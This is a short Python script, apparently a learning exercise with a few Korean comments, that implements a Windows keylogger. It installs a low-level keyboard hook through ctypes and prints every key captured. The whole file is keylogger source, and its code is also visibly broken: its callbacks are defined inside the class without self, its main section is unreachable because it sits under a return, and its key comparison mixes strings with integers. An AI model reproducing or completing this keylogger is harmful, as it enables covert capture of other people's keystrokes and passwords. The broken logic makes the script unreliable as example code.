import sys
from ctypes import *
from ctypes.util import *
from ctypes.wintypes import *

user32 = windll.user32
kernel32 = windll.kernel32

WH_KEYBOARD_LL = 13  # 로우레벨 키보드 훅 유형 ID코드를 표현한 상수
WM_KEYDOWN = 0x0100
VK_LCONTROL = 0xA2  # 162    #hardware Event ID


class KeyLogger:
    def __init__(self):
        self.IUser32 = user32
        self.hooked = None

    def installHookProc(self, ptr):
        self.hooked = self.IUser32.SetWindowsHookExA(
            WH_KEYBOARD_LL,
            ptr,
            kernel32.GetModuleHandleW(None),
            0
        )
        if not self.hooked:
            return False
        return True

    def uninstallHookProc(self):
        if self.hooked is None:
            return
        print('uninstalling')
        self.IUser32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None

    # definition of a callback function pointer generation function
    def getFuncPtr(fn):
        HOOKFUNC = WINFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
        return HOOKFUNC(fn)

    # definition of the hook procedure
    def hookProc(nCode, wParam, lParam):
        global keyLogger
        if wParam is not WM_KEYDOWN:
            return user32.CallNextHookEx(
                keyLogger.hooked,
                nCode,
                wParam,
                lParam
            )
        hookedKey = chr(lParam[0] & 0xffffffff)
        print('hookedkey=', hookedKey)
        if (hookedKey == VK_LCONTROL):
            print("cntl Pressed, call uninstalloHook()")
            keyLogger.uninstallHookProc()
            sys.exit(-1)

        return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)

        # main part of this program
        keyLogger = KeyLogger()

        ptr = getFuncPtr(hookProc)
        if keyLogger.installHookProc(ptr):
            print("keylogger just has been installed")
            print("aaaa")
